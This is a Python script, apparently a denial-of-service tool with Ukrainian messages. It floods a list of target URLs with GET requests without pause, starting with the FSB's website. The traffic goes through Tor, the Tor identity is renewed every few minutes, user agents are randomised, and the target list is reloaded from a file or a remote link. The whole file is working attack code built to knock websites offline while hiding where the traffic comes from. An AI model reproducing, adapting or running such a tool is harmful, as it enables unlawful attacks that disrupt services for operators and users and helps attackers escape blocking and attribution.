import asyncio
import os
import socket
import time
import traceback

import aiohttp
from aiohttp_socks import SocksConnector
from dotenv import load_dotenv
from stem import Signal
from stem.control import Controller

TOTAL_REQ, OK_REQ, BAD_REQ = 0, 0, 0
load_dotenv()

TOR_HOST = socket.gethostbyname(os.getenv('TOR_SERVER_HOST'))
while True:
    try:
        print("Завантажую версії браузерів")
        from fake_useragent import UserAgent

        USER_AGENT = UserAgent(path='data/useragent_list.json')
        break
    except:
        time.sleep(1)

DESTINATIONS = ['http://www.fsb.ru/']


async def renew_connection(sleep_min=5, infinity=True):
    """Send reload sygnal every X min"""
    while infinity:
        with Controller.from_port(address=TOR_HOST, port=9051) as controller:
            controller.authenticate(password=os.getenv("TOR_PASS"))
            controller.signal(Signal.NEWNYM)
        td = TorDosya()
        ip = await td.myip()
        print(f"Поточний IP: {ip}")
        await asyncio.sleep(sleep_min * 60)


async def load_from_file(link: str) -> list[str]:
    return [s.strip() for s in open(os.getenv('TARGET_LINKS')).readlines() if s.strip()[:4] == 'http']


async def load_from_link(link: str) -> list[str]:
    async with aiohttp.ClientSession() as session:
        async with session.get(link) as result:
            txt = await result.text()
            return [s.strip() for s in txt.split("\n") if s and s.strip()[:4] == 'http']

    return DESTINATIONS


async def load_links(link: str) -> list[str]:
    if link[:4] == 'http':
        ret = await load_from_link(link)
    else:
        ret = await load_from_file(link)
    return ret


async def reload_target(sleep_min=10):
    global DESTINATIONS
    while True:
        try:
            new_target = await load_links(os.getenv('TARGET_LINKS'))
            if set(new_target) != set(DESTINATIONS):
                print("Встановлюю нові цілі", new_target)
                DESTINATIONS = new_target[:]
        except Exception:
            raise Exception("Не можу завантажити цілі!")

        await asyncio.sleep(sleep_min * 60)


class TorDosya():

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(total=int(os.getenv('REQ_TIMEOUT')))

    @property
    def sock_connector(self):
        return SocksConnector.from_url(f'socks5://{TOR_HOST}:9050')

    async def run(self):
        global TOTAL_REQ, BAD_REQ, OK_REQ
        while True:
            ua = USER_AGENT.random
            for link in DESTINATIONS:
                async with aiohttp.ClientSession(connector=self.sock_connector, timeout=self.timeout) as session:
                    session.headers['user-agent'] = ua
                    TOTAL_REQ += 1
                    try:
                        async with session.get(link) as response:
                            if response.ok:
                                OK_REQ += 1
                                continue
                    except:
                        pass
                    BAD_REQ += 1

    async def myip(self):
        try:
            async with aiohttp.ClientSession(connector=self.sock_connector, timeout=self.timeout) as session:
                async with session.get("http://httpbin.org/ip") as response:
                    data = await response.json()
                    return data.get('origin')
        except Exception:
            pass
        return "Сервіс перевірки IP наразі недоступний."


async def statistic_info():
    while True:
        print(f"Усього запитів: {TOTAL_REQ}\tвідповідь є: {OK_REQ}\tне відповідає: {BAD_REQ}")
        await asyncio.sleep(int(os.getenv('STATS_MIN_UPDATE')) * 60)